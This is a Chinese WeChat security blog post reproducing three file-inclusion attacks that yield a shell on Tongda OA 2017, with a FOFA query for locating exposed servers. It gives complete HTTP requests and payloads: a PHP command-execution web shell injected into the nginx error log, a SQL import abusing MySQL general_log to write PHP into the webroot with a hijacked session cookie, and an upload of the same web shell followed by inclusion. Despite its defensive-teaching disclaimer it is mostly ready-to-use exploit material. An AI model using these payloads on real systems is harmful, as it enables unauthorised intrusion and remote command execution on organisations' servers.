> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wvwKoBVKfx57EVdVqmxdmA)

推文开头，先学习一下中华人民共和国网络安全法，大家要做一名合法的白帽子，不要做一些违法乱纪的事情。

```
https://www.cto.ac.cn/thread-106.htm
```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFAUdnHOIkkz7lxuSSmdDAgnrhg238LjAKFCoamn2ick3uPzTlFibTXPdQns8KNAIiakSfpc0M5hEU6GQ/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFAUdnHOIkkz7lxuSSmdDAgn9KCtNqV7fpbyKk9UviaMnHV74CkEKBywWmL1WJStQpibUz9V3N5dZrhQ/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFAUdnHOIkkz7lxuSSmdDAgn4e9QAM4Zk0Mq0DJWrjibL2icf4jSkAInkzFibibC7tRNef61sJ0txibJTZQ/640?wx_fmt=jpeg)

本推文仅用于信息防御技术教学，切勿用于其他用途，有侵权或者存在危害性，请联系我进行删除。

今天是平安夜

不会吧，不会吧

这么晚还有人搞安全？  

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4X7gIyPKOc7XCUiacicclymxdzAxnJRNVdgmAhtyEMAhEt1WHfAJxNM7MQ/640?wx_fmt=png)

不会吧，不会吧

还没有人收到 plmm 的苹果？  

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4X5NX94I8sT4svEhH69hN3zKkEhAI7dpbibQyCNESJ6P78uhY0oxx3x2g/640?wx_fmt=jpeg)

...

今天复现通达 OA 的文件包含 GETSHELL  

通达 OA 版本是 2017 版  

fofa 的搜索语法为  

```
app="TDXK-通达OA"
```

**第一种：错误日志写入，文件包含 GETSHELL**  

先写入错误日志  

```
http://x.x.x.x/<?php $command=$_POST['cmd'];$wsh = new COM('Wscript.shell');$exec = $wsh->exec("cmd /c ".$command);$stdout = $exec->StdOut();$stroutput = $stdout->ReadAll();echo $stroutput;?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4XrNyogPlKXjoSIdhLJiaw31UmwRqjkXta49JfFrEH2HEV6Eib51npSbMQ/640?wx_fmt=png)

尝试文件包含  

```
http://x.x.x.x/mac/gateway.php

post
json={"url":"/general/../../nginx/logs/oa.error.log"}&cmd=whoami
```

然后执行成功

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4XbJDk7Nc4eG1THsC6gXlqwZPI4B8ZmfciaTUCZqTSLNkrgdSbybvynKQ/640?wx_fmt=png)

**第二种：数据库文件导入，文件包含 GETSHELL**

此漏洞，还需要利用任意用户登陆这个漏洞，来配套使用

先获取用户 cookie

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4XkGYRX8xFygE58I0gTZB7P6JVmco8cU0Ip7te8iaUlnYLibgicwOL73BZw/640?wx_fmt=png)

脚本可以在 github 下载，这里我不提供了。

想知道完整获取 cookie 思路的，可以翻公众号的历史记录  

导入数据库文件  

```
POST /general/system/database/sql.php HTTP/1.1
Host:x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: PHPSESSID=gquvpovtbgsnrnmf65b04qhu11
Content-Length: 353
Content-Type: multipart/form-data; boundary=ffa8a9db2f0c70a97fba10db088eca26

--ffa8a9db2f0c70a97fba10db088eca26
Content-Disposition: form-data; 
Content-Type: application/octet-stream

set global general_log='on';
SET global general_log_file='D:/MYOA/webroot/test.php';
SELECT '<?php echo(md5(1));unlink(__FILE__);?>';
set global general_log='off';
--ffa8a9db2f0c70a97fba10db088eca26--
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4X76NSnA4uSUY5FSQ9vbyTheosE7fBFuxPIGwibdDnvU4RAicM9y9Vw8Bg/640?wx_fmt=png)

导入成功后，访问根目录下的 test.php 文件

```
http://x.x.x.x/test.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4XrxhoS9fOoJTD3UQbn0L5IamKRFp0K7h4HkLtMv4HRY2DUc8fskzjgA/640?wx_fmt=png)

发现写入的 php 脚本代码已经被执行。

**第三种：文件上传 + 文件包含 GETSHELL**

上传点依旧是上次那个点  

```
http://x.x.x.x/ispirit/im/upload.php
```

数据包  

```
POST /ispirit/im/upload.php HTTP/1.1
Host: x.x.x.x
Content-Length: 656
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
Cookie: PHPSESSID=123
Connection: close

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; 

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; 

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; 

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; 
Content-Type: image/jpeg

<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
------WebKitFormBoundarypyfBh1YB4pV8McGB--
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4XZ0AKh50IWGYTaGkoJv2V6dWOrTJs6tZYg2ddqhFLmKZvrCV5MqB6fw/640?wx_fmt=png)

上传成功后，尝试文件包含  

```
http://x.x.x.x/mac/gateway.php

post
json={"url":"/general/../../attach/im/2012/1472376370.txt"}&cmd=whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4XmiaXpiafQQnvXnY5r77qbuKTCW1ViccoZydlbpQTDdicabicptab8qEqWWQ/640?wx_fmt=png)

此时发现，命令执行成功，文件包含成功

看过上次同一个点上传文件后拿 shell 的朋友，肯定有疑问

为什么不写一句话马，然后直接拼接路径，菜刀连接，最后拿 shell

上次文件保存的路径是

```
D:\MYOA\webroot\im\2012\1894672167.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4X8ibicjslZ2biatAaQtPRB55czWBeN4K6NiaR63A4fApUMIwnqxFNBkdEcQ/640?wx_fmt=png)

而这次上传文件后，文件保存路径是

```
D:\MYOA\attach\im\2012\1472376370.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFAa8hKvu88D9eRk2gSz7ic4XEIAlyg4cQB6ibQbuocAgyCFC3fs9qicvmJXEG14EevN4qRTA8IEvnicfQ/640?wx_fmt=png)

简单的说，就是一个在网站根目录下，一个不在网站根目录下。

因此在拿通达 OA 这个版本下的 shell 时，要注意路径的差异。

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)  

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

**分享前辈知识，一起学习共同进步！！  
**

**如侵权请私聊公众号删文![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEeONmXRI9Dywia7psMDqZvkgQNq3l4ibv2ibyQCnzpO7w7W5jvxcHtWNyOQ4QbF9UibQcicqxShSwYWAA/640?wx_fmt=png)**